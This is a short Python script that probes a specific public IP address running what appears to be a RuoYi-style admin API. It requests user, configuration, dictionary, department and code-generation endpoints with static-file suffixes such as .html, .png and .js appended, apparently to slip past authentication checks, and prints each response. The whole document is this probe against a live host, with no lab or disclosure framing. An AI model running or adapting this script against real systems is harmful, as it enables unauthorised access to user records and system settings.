import urllib.request, time
base="http://144.123.22.234:9080/prod-api"
T=[
 "/tool/gen/genCode/sys_user.html",
 "/tool/gen/preview/sys_user.html",
 "/system/dict/data/type/sys_user_sex.html",
 "/system/dict/data/type/sys_normal_disable.html",
 "/system/config/configKey/sys.index.skinName.html",
 "/system/user/1/.html",
 "/system/notice/list.png",
 "/system/notice/1.png",
 "/system/notice/1.css",
 "/system/notice/1.js",
 "/system/notice/1.ico",
 "/system/dept/list/exclude/1.html",
]
for p in T:
    req=urllib.request.Request(base+p,method='GET',headers={'User-Agent':'Mozilla/5.0','Accept':'application/json'})
    try:
        with urllib.request.urlopen(req,timeout=15) as r: st=r.status; body=r.read(500).decode('utf-8','replace')
    except urllib.error.HTTPError as e: st=e.code; body=e.read(500).decode('utf-8','replace')
    except Exception as e: st=-1; body='ERR:'+str(e)
    print(f"[{st}] {p} :: {body[:200]}",flush=True)
    time.sleep(0.6)
